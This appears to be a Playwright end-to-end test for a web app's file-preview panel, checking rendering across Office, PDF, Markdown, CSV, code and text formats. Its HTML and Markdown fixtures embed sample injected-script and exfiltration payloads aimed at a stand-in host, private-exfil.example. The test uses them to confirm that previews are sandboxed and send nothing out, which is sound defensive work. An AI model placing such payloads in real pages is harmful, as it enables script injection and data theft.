import assert from "node:assert/strict";
import { chromium } from "playwright";
import { existsSync } from "node:fs";

const browser = await chromium.launch({
  executablePath:
    process.env.CHROMIUM_EXECUTABLE_PATH ||
    (existsSync("/usr/bin/chromium") ? "/usr/bin/chromium" : undefined),
  headless: true,
  args: ["--no-sandbox"],
});
const baseUrl = process.env.FAMSUN_TEST_BASE_URL || "http://127.0.0.1:5173";
const now = new Date().toISOString();
const files = [
  [
    "book",
    "销售分析.xlsx",
    "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
  ],
  ["md", "研究报告.md", "text/markdown"],
  ["html", "交付页面.html", "text/html"],
  ["csv", "数据.csv", "text/csv"],
  ["pdf", "实施手册.pdf", "application/pdf"],
  ["image", "图表.png", "image/png"],
  ["large", "大型日志.txt", "text/plain"],
  [
    "doc",
    "项目方案.docx",
    "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
  ],
  ["unsupported", "归档.zip", "application/zip"],
  ["code", "客户端设置与连接重试示例.tsx", "application/octet-stream"],
  ["json", "接口响应", "application/problem+json"],
  ["utf16", "中文日志.txt", "text/plain"],
  ["binary", "错误格式.py", "text/plain"],
  ["retry", "稍后可用.txt", "text/plain"],
  ["clipped", "长日志.txt", "text/plain"],
  [
    "deck",
    "业务汇报.pptx",
    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
  ],
  [
    "tall-doc",
    "极端图片.docx",
    "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
  ],
  [
    "tall-deck",
    "极端画布.pptx",
    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
  ],
].map(([id, name, mime_type]) => ({
  id,
  name,
  mime_type,
  session_id: "s1",
  size: id === "large" ? 3 * 1024 * 1024 : 1024,
  kind: ["md", "csv", "code"].includes(id) ? "upload" : "output",
  created_at: now,
  url: `/api/files/${id}/content`,
}));
let remoteRequests = 0;
const remoteUrls = [];
let failedRequests = 0;
let retryReady = false;
const sessions = [
  {
    id: "s1",
    title: "预览测试资料",
    created_at: now,
    updated_at: now,
    model: "model",
    pinned: false,
  },
  {
    id: "s2",
    title: "只有生成成果",
    created_at: now,
    updated_at: now,
    model: "model",
    pinned: false,
  },
];
const context = await browser.newContext({
  viewport: { width: 1440, height: 960 },
});
const page = await context.newPage();
await page.addInitScript(() => {
  const originalCreate = URL.createObjectURL.bind(URL);
  const originalRevoke = URL.revokeObjectURL.bind(URL);
  window.previewBlobUrls = new Set();
  URL.createObjectURL = (blob) => {
    const url = originalCreate(blob);
    window.previewBlobUrls.add(url);
    return url;
  };
  URL.revokeObjectURL = (url) => {
    window.previewBlobUrls.delete(url);
    originalRevoke(url);
  };
});
await page.route("https://private-exfil.example/**", (route) => {
  remoteRequests++;
  remoteUrls.push(route.request().url());
  return route.abort();
});
const json = (route, value, status = 200) =>
  route.fulfill({
    status,
    contentType: "application/json",
    body: JSON.stringify(value),
  });
const fixtureImage =
  "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAusB9Y9Zl1sAAAAASUVORK5CYII=";
// Authored 1 x 8192 raster exercises bounded display of unusual image geometry.
const tallFixtureImage =
  "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAACAACAIAAACUlrnnAAAAPUlEQVR4nO3DAQ0AAAgDoM8odrKTsQ0ibKRnK4mqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqfn51HED+jemkAwAAAABJRU5ErkJggg==";
function samplePdf() {
  const stream = (label) => `BT /F1 24 Tf 50 720 Td (${label}) Tj ET`;
  const first = stream("Preview page one");
  const second = stream("Preview page two");
  const objects = [
    "<< /Type /Catalog /Pages 2 0 R >>",
    "<< /Type /Pages /Kids [3 0 R 4 0 R] /Count 2 >>",
    "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 5 0 R >> >> /Contents 6 0 R >>",
    "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 5 0 R >> >> /Contents 7 0 R >>",
    "<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
    `<< /Length ${first.length} >>\nstream\n${first}\nendstream`,
    `<< /Length ${second.length} >>\nstream\n${second}\nendstream`,
  ];
  let pdf = "%PDF-1.4\n";
  const offsets = [0];
  for (const [index, object] of objects.entries()) {
    offsets.push(pdf.length);
    pdf += `${index + 1} 0 obj\n${object}\nendobj\n`;
  }
  const xref = pdf.length;
  pdf += `xref\n0 ${objects.length + 1}\n0000000000 65535 f \n`;
  pdf += offsets
    .slice(1)
    .map((offset) => `${String(offset).padStart(10, "0")} 00000 n \n`)
    .join("");
  pdf += `trailer\n<< /Size ${objects.length + 1} /Root 1 0 R >>\nstartxref\n${xref}\n%%EOF`;
  return pdf;
}
await context.route("**/api/**", async (route) => {
  const path = new URL(route.request().url()).pathname;
  if (path === "/api/auth/me")
    return json(route, {
      id: "u1",
      name: "测试用户",
      email: "preview@example.com",
      role: "admin",
    });
  if (path === "/api/settings")
    return json(route, {
      provider: {
        configured: false,
        api_mode: "responses",
        model: "model",
        base_url: "",
      },
      sandbox: { backend: "docker", available: true },
      limits: { max_upload_mb: 25, max_turns: 20 },
      registration_enabled: true,
    });
  if (path === "/api/sessions") return json(route, sessions);
  if (path === "/api/sessions/s1" || path === "/api/sessions/s2") {
    const onlyOutputs = path.endsWith("s2");
    return json(route, {
      session: sessions[onlyOutputs ? 1 : 0],
      messages: [],
      files: onlyOutputs
        ? files.filter((file) => file.kind === "output")
        : files,
      runs: [],
    });
  }
  if (path === "/api/files") return json(route, files);
  if (path === "/api/files/book/preview")
    return json(route, {
      kind: "spreadsheet",
      sheets: [
        {
          name: "销售汇总",
          rows: [
            ["区域", "销售额", "良品率", "复杂格式原值"],
            ["华东", 128000, 0.9863481228668942, 1.8863636363636416],
            ["华南", 96000, 0.99, null],
          ],
          display_rows: [
            [null, null, null, null],
            [null, "128,000.00 元", "98.63%", null],
            [null, "96,000.00 元", "99.00%", null],
          ],
          number_format_fallback: true,
          total_rows: 3,
          total_columns: 4,
          truncated: false,
        },
        {
          name: "月度明细",
          rows: Array.from({ length: 130 }, (_, i) => [
            `月份 ${i + 1}`,
            i * 100,
          ]),
          display_rows: Array.from({ length: 130 }, (_, i) => [
            null,
            `${(i * 100).toLocaleString("en-US")}.00`,
          ]),
          total_rows: 2500,
          total_columns: 2,
          truncated: true,
        },
      ],
      truncated: true,
    });
  if (path === "/api/files/doc/preview")
    return json(route, {
      kind: "document",
      paragraphs: ["项目实施方案", "本期完成数据接入与验证。"],
      blocks: [
        { type: "paragraph", text: "项目实施方案", heading: 1 },
        { type: "paragraph", text: "本期完成数据接入与验证。" },
        {
          type: "table",
          rows: [
            ["区域", "销售额"],
            ["华东", "128000"],
          ],
        },
        {
          type: "image",
          src: fixtureImage,
          alt: "文档内嵌图片",
          width: 120,
          height: 80,
        },
      ],
      truncated: false,
    });
  if (path === "/api/files/tall-doc/preview")
    return json(route, {
      kind: "document",
      paragraphs: [],
      blocks: [
        { type: "image", src: tallFixtureImage, width: 8192, height: 8192 },
      ],
      truncated: false,
    });
  if (path === "/api/files/tall-deck/preview")
    return json(route, {
      kind: "presentation",
      width: 1,
      height: 8192,
      total_slides: 1,
      slides: [{ title: "极端画布", elements: [] }],
      truncated: false,
    });
  if (path === "/api/files/deck/preview")
    return json(route, {
      kind: "presentation",
      width: 960,
      height: 540,
      total_slides: 2,
      truncated: false,
      slides: [
        {
          title: "季度业务汇报",
          background: "#f1f6fa",
          elements: [
            {
              type: "shape",
              x: 0,
              y: 0,
              width: 960,
              height: 12,
              fill: "#154e66",
            },
            {
              type: "text",
              x: 45,
              y: 40,
              width: 850,
              height: 80,
              text_frame: {
                margins: { top: 1, right: 2, bottom: 1, left: 2 },
                vertical_align: "top",
                word_wrap: true,
                auto_size: "shape_to_fit_text",
              },
              paragraphs: [
                {
                  text: "季度业务汇报",
                  font_size: 44,
                  bold: true,
                  color: "#154e66",
                },
              ],
            },
            {
              type: "text",
              x: 45,
              y: 140,
              width: 440,
              height: 80,
              paragraphs: [
                {
                  text: "保留文字、表格与图片的位置",
                  font_size: 26,
                  color: "#34495e",
                },
              ],
            },
            {
              type: "table",
              x: 45,
              y: 250,
              width: 440,
              height: 136,
              column_widths: [88, 352],
              row_heights: [26, 24, 24, 62],
              rows: [
                ["区域", "销售额"],
                ["华东", "128000"],
                ["华南", "96000"],
                [
                  "说明",
                  "按数据口径保留较长的经营分析说明，原始宽列可完整展示这些文字而无需缩小字号。",
                ],
              ],
              cells: [
                ["区域", "销售额"],
                ["华东", "128000"],
                ["华南", "96000"],
                [
                  "说明",
                  "按数据口径保留较长的经营分析说明，原始宽列可完整展示这些文字而无需缩小字号。",
                ],
              ].map((row) =>
                row.map((text) => ({
                  paragraphs: [{ text, font_size: 14 }],
                  text_frame: {
                    margins: { top: 2, right: 4, bottom: 2, left: 4 },
                    vertical_align: "top",
                  },
                })),
              ),
            },
            {
              type: "image",
              x: 580,
              y: 200,
              width: 220,
              height: 160,
              src: fixtureImage,
              alt: "幻灯片内嵌图片",
            },
            {
              type: "shape",
              shape: "ellipse",
              x: 840,
              y: 440,
              width: 55,
              height: 55,
              fill: "#f28c28",
            },
          ],
        },
        {
          title: "下一步",
          elements: [
            {
              type: "text",
              x: 60,
              y: 60,
              width: 800,
              height: 36,
              text_frame: {
                margins: { top: 1, right: 1, bottom: 1, left: 1 },
                vertical_align: "top",
                word_wrap: true,
                auto_size: "shape_to_fit_text",
              },
              paragraphs: [
                {
                  text: "下一步行动",
                  font_size: 40,
                  space_before: 2,
                  space_after: 3,
                  line_spacing: { kind: "multiple", value: 1.25 },
                },
                {
                  text: "继续优化交付效率",
                  font_size: 26,
                  line_spacing: { kind: "pixels", value: 30 },
                },
              ],
            },
          ],
        },
      ],
    });
  if (path === "/api/files/md/content")
    return route.fulfill({
      contentType: "text/markdown",
      body: "# 研究结论\n\n**收入稳步增长。**\n\n|季度|收入|\n|---|---|\n|Q1|120|\n\n![远程图片](https://private-exfil.example/md)\n\n<script>window.previewAttack = true</script>",
    });
  if (path === "/api/files/html/content")
    return route.fulfill({
      contentType: "text/html",
      body: "<h1>交付页面</h1><script>parent.previewAttack = true; fetch('https://private-exfil.example/script')</script><img src='https://private-exfil.example/image'><style>body{background-image:url(https://private-exfil.example/css)}</style><a href='https://private-exfil.example/link'>恶意链接</a><form action='https://private-exfil.example/form'><button>提交</button></form>",
    });
  if (path === "/api/files/csv/content")
    return route.fulfill({
      contentType: "text/csv",
      body: '\ufeff名称,说明,金额\r\n"华东,一区","第一行\n第二行",123\r\n"引号""测试",正常,456',
    });
  if (path === "/api/files/pdf/content")
    return route.fulfill({ contentType: "application/pdf", body: samplePdf() });
  if (path === "/api/files/image/content")
    return route.fulfill({
      contentType: "image/png",
      body: Buffer.from(
        "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAusB9Y9Zl1sAAAAASUVORK5CYII=",
        "base64",
      ),
    });
  if (path === "/api/files/code/content")
    return route.fulfill({
      contentType: "text/plain",
      body: 'export function App() {\n  const label: string = "连接状态";\n  return <button>{label}</button>;\n}\n',
    });
  if (path === "/api/files/json/content")
    return route.fulfill({
      contentType: "application/problem+json",
      body: '{"status":"ready","count":42}',
    });
  if (path === "/api/files/utf16/content")
    return route.fulfill({
      contentType: "text/plain",
      body: Buffer.from("\ufeff中文日志内容\n加载完成", "utf16le"),
    });
  if (path === "/api/files/binary/content")
    return route.fulfill({
      contentType: "text/plain",
      body: Buffer.from([80, 75, 0, 0, 1, 2]),
    });
  if (path === "/api/files/retry/content") {
    return !retryReady
      ? json(route, { detail: "unavailable" }, 503)
      : route.fulfill({ contentType: "text/plain", body: "恢复后可查看" });
  }
  if (path === "/api/files/clipped/content")
    return route.fulfill({
      contentType: "text/plain",
      body: "日志记录\n".repeat(52_000),
    });
  failedRequests++;
  return json(route, { detail: "unexpected route" }, 404);
});

async function openFile(name) {
  await page.getByRole("button", { name, exact: true }).click();
  const dialog = page.getByRole("dialog", { name });
  if (process.env.FAMSUN_OFFICE_BASELINE !== "1") {
    await dialog.getByRole("button", { name: "全屏预览", exact: true }).click();
    await page.waitForFunction(() =>
      document.querySelector(".file-preview-modal.modal-fullscreen"),
    );
    const bounds = await dialog.boundingBox();
    const viewport = page.viewportSize();
    assert.ok(
      Math.abs(bounds.width - viewport.width) < 2 &&
        Math.abs(bounds.height - viewport.height) < 2,
      `${name}: fullscreen fills viewport`,
    );
    await dialog.getByRole("button", { name: "退出全屏", exact: true }).click();
    await page.waitForFunction(
      () => !document.querySelector(".file-preview-modal.modal-fullscreen"),
    );
    assert.equal(
      await dialog.count(),
      1,
      "Leaving fullscreen keeps the file open",
    );
  }
  return dialog;
}
async function closePreview() {
  await page.getByRole("button", { name: "关闭弹窗" }).click();
}
try {
  await page.goto(baseUrl);
  if (process.env.FAMSUN_OFFICE_BASELINE === "1") {
    await page.getByRole("button", { name: "文件空间", exact: true }).click();
    const document = await openFile("项目方案.docx");
    await document.getByText("本期完成数据接入与验证。").waitFor();
    const docTables = await document.locator("table").count();
    const docImages = await document.locator(".document-preview img").count();
    await page.screenshot({
      path: "/tmp/famsun-office-docx-fixture-before.png",
    });
    await closePreview();
    const deck = await openFile("业务汇报.pptx");
    await deck.getByText("此格式可下载后使用对应应用打开。").waitFor();
    await page.screenshot({
      path: "/tmp/famsun-office-pptx-fixture-before.png",
    });
    console.log("Authored Office fixture baseline (not live model evidence)", {
      docTables,
      docImages,
      pptx: "unsupported",
    });
    await browser.close();
    process.exit(0);
  }
  const workspace = page.locator(".workspace-panel");
  await workspace.getByRole("tab", { name: "已上传（0）" }).click();
  await workspace
    .getByText("还没有上传文件。上传的资料会出现在这里。")
    .waitFor();
  await page
    .locator(".session-select")
    .filter({ hasText: "预览测试资料" })
    .click();
  await workspace.getByRole("tab", { name: "已上传（3）" }).waitFor();
  assert.equal(await workspace.locator(".file-tile").count(), 3);
  assert.equal(
    await workspace
      .getByRole("tab", { name: "已上传（3）" })
      .getAttribute("aria-selected"),
    "true",
  );
  await workspace.getByRole("tab", { name: /生成成果/ }).click();
  assert.equal(await workspace.locator(".file-tile").count(), files.length - 3);
  await page.keyboard.press("Home");
  assert.equal(
    await workspace
      .getByRole("tab", { name: /全部文件/ })
      .getAttribute("aria-selected"),
    "true",
  );
  assert.equal(await workspace.locator(".file-tile").count(), files.length);
  await page.keyboard.press("ArrowRight");
  assert.equal(await workspace.locator(".file-tile").count(), 3);
  await page
    .locator(".session-select")
    .filter({ hasText: "只有生成成果" })
    .click();
  await workspace.getByRole("tab", { name: "已上传（0）" }).waitFor();
  await workspace
    .getByText("还没有上传文件。上传的资料会出现在这里。")
    .waitFor();
  await page.getByRole("button", { name: "文件空间", exact: true }).click();
  const excel = await openFile("销售分析.xlsx");
  await excel.getByRole("tab", { name: "销售汇总" }).waitFor();
  assert.equal(
    await excel
      .getByRole("cell", { name: "128,000.00 元", exact: true })
      .textContent(),
    "128,000.00 元",
  );
  const percent = excel.getByRole("cell", { name: "98.63%", exact: true });
  await percent.waitFor();
  assert.equal(await percent.getAttribute("class"), "cell-number");
  await excel
    .getByRole("cell", { name: "1.8863636363636416", exact: true })
    .waitFor();
  await excel
    .getByText("部分数字或日期格式暂不支持，已显示原始值；完整格式请下载查看。")
    .waitFor();
  await excel.getByRole("tab", { name: "月度明细" }).click();
  await excel.getByText(/已截取/).waitFor();
  await excel.getByRole("button", { name: "下一页数据" }).click();
  await excel.getByRole("cell", { name: "月份 101", exact: true }).waitFor();
  await excel.getByRole("cell", { name: "10,000.00", exact: true }).waitFor();
  await page.screenshot({
    path: "/tmp/famsun-spreadsheet-preview.png",
    animations: "disabled",
  });
  await page.keyboard.press("Escape");
  assert.equal(await page.getByRole("dialog").count(), 0);
  const md = await openFile("研究报告.md");
  await md.getByRole("heading", { name: "研究结论" }).waitFor();
  assert.equal(await md.locator("strong").textContent(), "收入稳步增长。");
  await md.getByRole("button", { name: "源文件" }).click();
  await md.locator("pre").filter({ hasText: "# 研究结论" }).waitFor();
  await closePreview();
  const html = await openFile("交付页面.html");
  await html.locator("iframe").waitFor();
  await page
    .frameLocator('iframe[title="交付页面.html"]')
    .getByRole("heading", { name: "交付页面" })
    .waitFor();
  await page.waitForTimeout(150);
  assert.equal(remoteRequests, 0, remoteUrls.join(", "));
  assert.equal(await page.evaluate(() => window.previewAttack), undefined);
  assert.equal(
    await html.locator("iframe").getAttribute("sandbox"),
    "allow-scripts",
  );
  await closePreview();
  const csv = await openFile("数据.csv");
  await csv.getByRole("cell", { name: "华东,一区", exact: true }).waitFor();
  assert.equal(
    await csv
      .getByRole("cell", { name: '引号"测试', exact: true })
      .textContent(),
    '引号"测试',
  );
  await closePreview();
  const pdf = await openFile("实施手册.pdf");
  await pdf.getByText("1 / 2 页", { exact: true }).waitFor();
  await page.waitForFunction(
    () =>
      document.querySelector(".pdf-canvas-scroll canvas")?.width > 100 &&
      !document.querySelector(".pdf-busy"),
  );
  await pdf.getByRole("button", { name: "下一页 PDF" }).click();
  await pdf.getByText("2 / 2 页", { exact: true }).waitFor();
  await pdf.getByRole("button", { name: "放大 PDF" }).click();
  await pdf
    .getByRole("button", { name: "适合页面宽度" })
    .filter({ hasText: "125%" })
    .waitFor();
  await page.waitForFunction(() => !document.querySelector(".pdf-busy"));
  assert.equal(await pdf.getByRole("alert").count(), 0);
  await page.screenshot({
    path: "/tmp/famsun-pdf-preview.png",
    animations: "disabled",
  });
  await closePreview();
  const doc = await openFile("项目方案.docx");
  await doc.getByText("本期完成数据接入与验证。").waitFor();
  await doc.getByRole("cell", { name: "128000", exact: true }).waitFor();
  await doc.getByRole("img", { name: "文档内嵌图片" }).waitFor();
  await page.screenshot({ path: "/tmp/famsun-office-docx-fixture-after.png" });
  await closePreview();
  const deck = await openFile("业务汇报.pptx");
  await deck.getByText("1 / 2 页", { exact: true }).waitFor();
  await deck.getByRole("cell", { name: "128000", exact: true }).waitFor();
  const nativeTable = await deck.locator(".slide-table").evaluate((table) => ({
    columns: [...table.querySelectorAll("col")].map(
      (col) => getComputedStyle(col).width,
    ),
    font: getComputedStyle(table.querySelector("td p")).fontSize,
    headerColor: getComputedStyle(table.querySelector("td p")).color,
    padding: getComputedStyle(table.querySelector("td")).padding,
    clipped:
      table.parentElement.scrollHeight > table.parentElement.clientHeight + 2,
  }));
  assert.deepEqual(nativeTable.columns, ["88px", "352px"]);
  assert.equal(nativeTable.font, "14px");
  assert.equal(nativeTable.headerColor, "rgb(255, 255, 255)");
  assert.equal(nativeTable.padding, "2px 4px");
  assert.equal(nativeTable.clipped, false);
  assert.equal(await deck.locator("svg.presentation-slide image").count(), 1);
  assert.equal(await deck.locator("svg.presentation-slide ellipse").count(), 1);
  assert.equal(
    await deck.locator("svg.presentation-slide").getAttribute("viewBox"),
    "0 0 960 540",
  );
  await page.screenshot({ path: "/tmp/famsun-office-pptx-fixture-after.png" });
  await deck.getByRole("button", { name: "下一张幻灯片" }).click();
  await deck.getByText("2 / 2 页", { exact: true }).waitFor();
  await deck.getByText("下一步行动", { exact: true }).waitFor();
  const growingText = await deck.locator(".slide-text").evaluate((element) => ({
    height: element.clientHeight,
    scrollHeight: element.scrollHeight,
    padding: getComputedStyle(element).padding,
    lineHeight: getComputedStyle(element.querySelector("p")).lineHeight,
    overflow: getComputedStyle(element.parentElement).overflow,
  }));
  assert.ok(
    growingText.height > 36,
    "native SHAPE_TO_FIT_TEXT should grow instead of clip",
  );
  assert.ok(growingText.scrollHeight <= growingText.height + 1);
  assert.equal(growingText.padding, "1px");
  assert.equal(growingText.lineHeight, "50px");
  assert.equal(growingText.overflow, "visible");
  await closePreview();
  const image = await openFile("图表.png");
  await image.getByRole("img", { name: "图表.png" }).waitFor();
  await page.waitForFunction(
    () => document.querySelector(".preview-body img")?.naturalWidth > 0,
  );
  assert.equal(await page.evaluate(() => window.previewBlobUrls.size), 1);
  await closePreview();
  assert.equal(await page.evaluate(() => window.previewBlobUrls.size), 0);
  const large = await openFile("大型日志.txt");
  await large.getByText("文件较大，请下载后查看完整内容。").waitFor();
  await large.getByRole("link", { name: "下载文件" }).waitFor();
  await closePreview();
  const archive = await openFile("归档.zip");
  await archive.getByText("此格式可下载后使用对应应用打开。").waitFor();
  await archive.getByRole("link", { name: "下载文件" }).waitFor();
  await closePreview();
  const code = await openFile("客户端设置与连接重试示例.tsx");
  await code
    .locator("pre")
    .filter({ hasText: "export function App" })
    .waitFor();
  assert.ok(
    (await code.locator('pre [class*="hljs-"]').count()) > 0,
    "code preview should contain highlighted tokens",
  );
  await code.getByRole("button", { name: /复制/ }).waitFor();
  await page.screenshot({
    path: "/tmp/famsun-code-preview.png",
    animations: "disabled",
  });
  await closePreview();
  const jsonPreview = await openFile("接口响应");
  await jsonPreview
    .locator("pre")
    .filter({ hasText: '"status": "ready"' })
    .waitFor();
  assert.ok((await jsonPreview.locator('pre [class*="hljs-"]').count()) > 0);
  await closePreview();
  const utf16 = await openFile("中文日志.txt");
  await utf16.locator("pre").filter({ hasText: "中文日志内容" }).waitFor();
  assert.ok(!(await utf16.locator("pre").textContent()).includes("�"));
  await closePreview();
  const binary = await openFile("错误格式.py");
  await binary.getByRole("alert").filter({ hasText: "二进制内容" }).waitFor();
  await closePreview();
  const retry = await openFile("稍后可用.txt");
  await retry.getByRole("alert").waitFor();
  retryReady = true;
  await retry.getByRole("button", { name: "重新加载" }).click();
  await retry.locator("pre").filter({ hasText: "恢复后可查看" }).waitFor();
  await closePreview();
  const clipped = await openFile("长日志.txt");
  await clipped.getByRole("status").filter({ hasText: "250,000" }).waitFor();
  assert.equal(
    (await clipped.locator("pre code").textContent()).length,
    250_000,
  );
  await closePreview();
  await page.setViewportSize({ width: 390, height: 844 });
  const mobile = await openFile("销售分析.xlsx");
  await mobile.getByRole("tab", { name: "销售汇总" }).waitFor();
  assert.equal(
    await page.evaluate(
      () => document.documentElement.scrollWidth <= innerWidth,
    ),
    true,
  );
  await page.screenshot({
    path: "/tmp/famsun-preview-mobile.png",
    animations: "disabled",
  });
  await closePreview();
  const mobileCode = await openFile("客户端设置与连接重试示例.tsx");
  await mobileCode.locator('pre [class*="hljs-"]').first().waitFor();
  assert.equal(
    await page.evaluate(
      () => document.documentElement.scrollWidth <= innerWidth,
    ),
    true,
  );
  const closeBounds = await mobileCode
    .getByRole("button", { name: "关闭弹窗" })
    .boundingBox();
  assert.ok(closeBounds.x + closeBounds.width <= 390);
  await page.screenshot({
    path: "/tmp/famsun-code-preview-mobile.png",
    animations: "disabled",
  });
  await closePreview();
  for (const [filename, selector] of [
    ["极端图片.docx", ".document-figure img"],
    ["极端画布.pptx", ".presentation-slide"],
  ]) {
    const extreme = await openFile(filename);
    await extreme.locator(selector).waitFor();
    for (const [width, height] of [
      [1280, 900],
      [390, 760],
    ]) {
      await page.setViewportSize({ width, height });
      const bounds = await extreme.locator(selector).boundingBox();
      assert.ok(
        bounds.height <= height && bounds.width <= width,
        `${filename} must fit the viewport`,
      );
      assert.ok(
        await extreme
          .locator(".preview-body")
          .evaluate((node) => node.scrollHeight < 3000),
        `${filename} must not create unbounded vertical scrolling`,
      );
    }
    await closePreview();
  }
  assert.equal(failedRequests, 0);
  console.log(
    "PASS: workspace all/upload/output filters/counts/keyboard/empty state; Excel pagination, Markdown/source, isolated HTML, quoted CSV, PDF, DOCX, image cleanup, code/JSON highlighting, UTF-16 text, binary rejection, retry, preview truncation, downloads, Escape, mobile overflow",
  );
} catch (error) {
  console.error(
    await page
      .locator(".preview-body")
      .textContent()
      .catch(() => "no preview"),
  );
  throw error;
} finally {
  await browser.close();
}
